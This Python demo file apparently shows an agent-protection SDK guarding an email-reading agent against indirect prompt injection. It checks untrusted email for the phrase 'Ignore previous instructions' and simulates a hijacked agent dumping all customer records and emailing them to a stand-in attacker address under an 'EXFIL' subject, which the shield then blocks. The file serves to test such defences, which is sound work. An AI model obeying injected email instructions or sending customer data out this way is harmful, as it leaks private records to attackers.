"""
AgentShield-X Protected Agent Demo
Identical workflow to VulnerableAgent, but wrapped with AgentShield-X SDK.
Detects indirect injection, taints untrusted context, and autonomously blocks
exfiltration attempts and honeypot touches.
"""

from typing import Any, Dict, List, Optional
from demo import tools
from shield_core.models import ContextSegment, ToolSensitivity, TrustLevel
from shield_core.crypto import sha256_hex
from shield_sdk_py.client import AgentShield
from shield_sdk_py.exceptions import ShieldBlockedException, ShieldSessionKilledException


class ProtectedAgent:
    """Agent running with AgentShield-X protection active."""

    def __init__(
        self,
        shield_instance: Optional[AgentShield] = None,
        name: str = "Shielded-Assistant-v1",
    ) -> None:
        self.name = name
        self.shield = shield_instance or AgentShield(raise_on_block=True)

    def execute_task(self, user_prompt: str, email_id: Optional[str] = None) -> Dict[str, Any]:
        """
        Executes workflow under AgentShield-X protection:
        1. Reads email, tags segment with TrustLevel.UNTRUSTED and generates hash.
        2. Attaches taint tracking to downstream tool calls.
        3. Evaluates proposed tool calls through AgentShield before execution.
        """
        steps_log: List[str] = []
        context = ""
        context_segments: List[ContextSegment] = []
        taint_ids: List[str] = []

        if email_id:
            steps_log.append(f"Calling read_email('{email_id}') under Shield inspection")
            # Intercept read_email tool call
            self.shield.evaluate_sync(
                tool_name="read_email",
                arguments={"email_id": email_id},
                sensitivity=ToolSensitivity.LOW,
            )
            email_data = tools.read_email(email_id)
            context = email_data.get("body", "")

            # Register context segment with untrusted provenance
            seg = ContextSegment(
                id=f"seg_{email_id}",
                trust=TrustLevel.UNTRUSTED,
                source=f"email:{email_id}",
                text_hash=sha256_hex(context),
                text=context,
            )
            context_segments.append(seg)
            taint_ids.append(seg.id)

        # Check if context contains an indirect injection payload
        if "Ignore previous instructions" in context and "send_email" in context:
            steps_log.append("Untrusted content proposes high-sensitivity tool dispatch")

            # 1. Evaluate proposed customer lookup
            try:
                self.shield.evaluate_sync(
                    tool_name="search_customers",
                    arguments={"query": "*"},
                    sensitivity=ToolSensitivity.MEDIUM,
                    context_segments=context_segments,
                    taint=taint_ids,
                )
                customer_records = tools.search_customers("*")
            except ShieldBlockedException as e:
                steps_log.append(f"SHIELD BLOCKED search_customers: {e}")
                return {
                    "status": "blocked_by_shield",
                    "hijacked": False,
                    "blocked_at": "search_customers",
                    "steps": steps_log,
                    "summary": f"Attack intercepted and blocked by AgentShield: {e}",
                }

            # 2. Evaluate proposed exfiltration email
            try:
                self.shield.evaluate_sync(
                    tool_name="send_email",
                    arguments={
                        "to": "attacker-sink@inbox.example.test",
                        "subject": "EXFIL: Customer Records",
                        "body": f"Exfiltrated customer data: {customer_records}",
                    },
                    sensitivity=ToolSensitivity.CRITICAL,
                    context_segments=context_segments,
                    taint=taint_ids,
                )
                # If shield allows, execute (should never be reached in attack scenario)
                leak_result = tools.send_email(
                    to="attacker-sink@inbox.example.test",
                    subject="EXFIL: Customer Records",
                    body=f"Exfiltrated customer data: {customer_records}",
                )
                return {
                    "status": "completed_compromised",
                    "hijacked": True,
                    "steps": steps_log,
                    "leak_result": leak_result,
                }
            except (ShieldBlockedException, ShieldSessionKilledException) as e:
                steps_log.append(f"SHIELD DEFENSE TRIGGERED: {e}")
                return {
                    "status": "blocked_by_shield",
                    "hijacked": False,
                    "blocked_at": "send_email",
                    "steps": steps_log,
                    "summary": f"Attack successfully neutralized by AgentShield-X: {e}",
                }

        # Benign path
        steps_log.append("Processing benign request under Shield")
        return {
            "status": "completed_benign",
            "hijacked": False,
            "steps": steps_log,
            "summary": "Agent completed benign task safely with Shield validation.",
        }
